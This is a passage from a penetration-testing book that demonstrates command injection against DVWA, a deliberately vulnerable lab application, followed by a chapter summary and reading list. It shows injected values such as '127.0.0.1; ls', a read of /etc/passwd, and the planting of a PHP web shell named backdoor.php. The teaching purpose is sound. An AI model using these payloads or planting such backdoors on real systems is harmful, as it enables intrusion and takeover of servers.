  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/67be9982-8445-40b7-8f7e-83d998f88049.jpg)'
  id: totrans-297
  prefs: []
  type: TYPE_IMG
- en: We get the expected result. Now, let's try to pass another command into this
    input. We know that this application is being hosted on Linux. To join commands
    in Linux, we can use `&&` between the commands.
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
- en: 'With `&&`, the previous command must complete successfully before the following
    command gets executed. `;` will execute the command whether or not the previous
    completed successfully. Let''s try it with a basic `ls` command. In the input
    box, enter `127.0.0.1; ls` and then click Submit:'
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/92f93794-3eab-4af8-a70c-49476382b33b.jpg)'
  id: totrans-300
  prefs: []
  type: TYPE_IMG
- en: 'Now we''ve confirmed that the input is not validated before it is processed,
    as the lines after the ping statistics show us the files of the current directory.
    We can expand on this and get the current directory we''re in and what user is
    executing the commands. Enter `127.0.0.1`; `pwd`; `whoami`:'
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/969d3e82-1248-4e80-b20a-3e820bec1624.jpg)'
  id: totrans-302
  prefs: []
  type: TYPE_IMG
- en: 'From our results, we see that we''re currently in the `/owaspbwa/dvwa-git/vulnerabilities/exec`
    directory and we''re executing the commands as the `www-data` user. Now let''s
    try to print the contents of a file, specifically the `/etc/passwd` file. In the
    input field, enter `127.0.0.1` and `cat /etc/paswd`:'
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/dd2b0c08-949f-46af-ab68-60bb8f2ac836.jpg)'
  id: totrans-304
  prefs: []
  type: TYPE_IMG
- en: This snippet should look like the results from our earlier LFI.
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
- en: Let's do one more thing. Let's create a file in the directory and we can always
    refer to this later to execute commands. Enter `127.0.0.1` and `echo “<?php system(\$_GET[‘cmd’])
    ?>” > backdoor.php`. This should create a PHP file with the name `backdoor` and
    the PHP code inside should be system (`\$_GET[‘cmd’]`).
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
- en: Now, in the browser, navigate to `<ip address>/dvwa/vulnerabilities/exec/backdoor.php`.
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
- en: 'The page loads, however, nothing is displayed. This is because we have not
    passed any commands yet. Looking at what we type, in single quotes we have `cmd`.
    This is our variable that stores the command we would like to execute and passes
    it to the system for execution. To execute a command, after `backdoor.php` in
    the address bar, enter `?cmd=` and then your command. I''ll use `ls` as a basic
    demo:'
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/eed2b93b-7672-43f3-86a4-03ef5d90ad26.jpg)'
  id: totrans-309
  prefs: []
  type: TYPE_IMG
- en: 'Use your imagination from this point to try different possibilities. Admittedly,
    the presentation needs a bit of work, but you can always view the source code
    to clean it up:'
  id: totrans-310
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/aa4904c9-ae34-46bf-8804-5e1c3f77859a.jpg)'
  id: totrans-311
  prefs: []
  type: TYPE_IMG
- en: I would add that you can use the Repeater in Burp Suite to do these steps and
    you can also use Burp Suite in conjunction with `sqlmap` and Metasploit to get
    a meterpreter shell.
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  id: totrans-313
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we took a look at some of the major tools used for web application
    testing and, by extension, cloud applications, as they are built on the same protocols
    and use many of the same platforms.
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
- en: As you can tell, these vulnerabilities have a common root cause, that is, user
    input that is not sanitized or validated to ensure that the required data is being
    used for processing. Additionally, the exploitation of one vulnerability can allow
    for another to be exploited (directory traversal to file inclusion, as an example).
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
- en: We looked at OWASP ZAP, Nikto, `sqlmap`, and Burp Suite to identify possible
    vulnerabilities, test for them, and exploit them. However, Kali comes with many
    other tools that can be used to do these tests and many can be used together.
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
- en: Burp Suite and OWASP ZAP in particular are very powerful standalone tools that
    accomplish all that we've looked at and even some things we did not look at. We
    can even use them to do directory-traversal and file-inclusion tests.
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
- en: 'Some other tools to look at are the following:'
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
- en: Commix (Command injection vulnerability tool)
  id: totrans-319
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: DirBuster (web server directory brute-force tool)
  id: totrans-320
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Recon-NG (web reconnaissance tool)
  id: totrans-321
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Sqlninja (Microsoft SQL injection tool)
  id: totrans-322
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: In the next chapter, we'll be taking a look at wireless network analysis, attacking
    the networks using various tools to gain access, and methods of maintaining access
    to the network. We'll even look at the initial steps in setting up an Evil Twin
    (Rogue AP).
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
- en: Further reading
  id: totrans-324
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'There are many resources available to understand more about web and cloud application
    testing. Here is a list of resources:'
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
- en: '*Kali Linux Web Penetration Testing Cookbook – Second Edition* (Packt Publishing)'
  id: totrans-326
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: OWASP Top 10 2017 – The Ten Most Critical Web Application Security Risks: [https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)
  id: totrans-327
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: OWASP Foundation: [https://www.owasp.org/index.php/Main_Page](https://www.owasp.org/index.php/Main_Page)
  id: totrans-328
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
